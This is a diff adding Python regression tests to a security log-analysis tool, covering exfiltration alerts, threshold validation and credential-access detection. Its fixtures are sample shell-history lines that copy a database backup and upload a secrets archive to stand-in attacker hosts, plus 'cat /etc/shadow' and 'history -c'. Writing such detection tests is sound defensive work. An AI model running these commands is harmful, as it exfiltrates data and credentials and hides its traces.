@@ -142,6 +142,25 @@ class DetectionRegressionTests(unittest.TestCase):
         self.assertIn("防御规避", phases)
         self.assertEqual({event.details.get("source_type") for event in result.events}, {"shell-history"})
 
+    def test_shell_history_data_exfiltration_creates_alert_and_incident(self):
+        content = "\n".join([
+            "scp /var/backups/db.sql.gz attacker@198.51.100.10:/tmp/db.sql.gz",
+            "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
+        ]) + "\n"
+
+        result = parse_shell_history(content, "server01:/home/alice/.bash_history")
+        summary = run_detection(result.events)
+        alert = next((item for item in summary.alerts if item.rule_id == "EXFIL-001"), None)
+
+        self.assertIsNotNone(alert)
+        self.assertEqual(alert.mitre_phase, "数据外传")
+        self.assertEqual(alert.level, ThreatLevel.HIGH)
+        self.assertEqual(len(alert.affected_events), 2)
+        self.assertTrue(any("疑似外传命令" in item for item in summary.recommendations))
+        phases = {item.phase for item in summary.attack_chain}
+        self.assertIn("数据外传", phases)
+        self.assertTrue(any("数据外传" in incident.attack_phases for incident in summary.incidents))
+
     def test_shell_history_incident_subject_is_actionable_without_asset_context(self):
         content = "cat /etc/shadow\nhistory -c\n"
         result = parse_shell_history(content, ".bash_history")
@@ -451,6 +470,19 @@ class DetectionRegressionTests(unittest.TestCase):
         # 其它字段沿用默认
         self.assertEqual(loaded.spray_min_unique_users, THRESHOLDS.spray_min_unique_users)
 
+    def test_threshold_validation_rejects_invalid_ranges(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            cfg_path = Path(tmp) / "bad-thresholds.json"
+            cfg_path.write_text(
+                _json.dumps({"brute_force_min": 10, "brute_force_high": 3}),
+                encoding="utf-8",
+            )
+            with self.assertRaisesRegex(ValueError, "brute_force_high"):
+                load_thresholds(str(cfg_path))
+
+        with self.assertRaisesRegex(ValueError, "generic_parse_line_limit"):
+            validate_thresholds(Thresholds(generic_parse_line_limit=0))
+
     def test_threshold_env_and_config_merge_without_global_state_leak(self):
         with tempfile.TemporaryDirectory() as tmp:
             log_path = Path(tmp) / "auth.log"
@@ -476,6 +508,38 @@ class DetectionRegressionTests(unittest.TestCase):
         alert = next(item for item in result.summary.alerts if item.rule_id == "BRUTE-001")
         self.assertEqual(alert.level, ThreatLevel.MEDIUM)
         self.assertEqual(load_thresholds_from_env(DEFAULT_THRESHOLDS).brute_force_min, DEFAULT_THRESHOLDS.brute_force_min)
+
+    def test_credential_access_detector_uses_selector(self):
+        from bla.detection.engine import get_default_detector_registry
+
+        registry = get_default_detector_registry()
+        spec = next(item for item in registry.list() if item.name == "credential-access")
+        self.assertIsNotNone(spec.selector)
+
+        noise = LogEvent(
+            id="noise",
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.INFO,
+            category="认证",
+            source="fixture",
+            source_file="auth.log",
+            message="failed login",
+            raw_line="failed login",
+            tags=["failed-login"],
+        )
+        credential = LogEvent(
+            id="cred",
+            timestamp="2024-03-15T10:00:01",
+            level=ThreatLevel.HIGH,
+            category="Shell",
+            source="fixture",
+            source_file=".bash_history",
+            message="cat /etc/shadow",
+            raw_line="cat /etc/shadow",
+            tags=["credential-access", "linux-credential-file"],
+        )
+        selected = spec.select_events(DetectionEventIndex([noise, credential]))
+        self.assertEqual([event.id for event in selected], ["cred"])
 
     def test_builtin_yaml_web_rule_detects_log4shell(self):
         """内置 YAML 规则应参与 Web 检测。"""
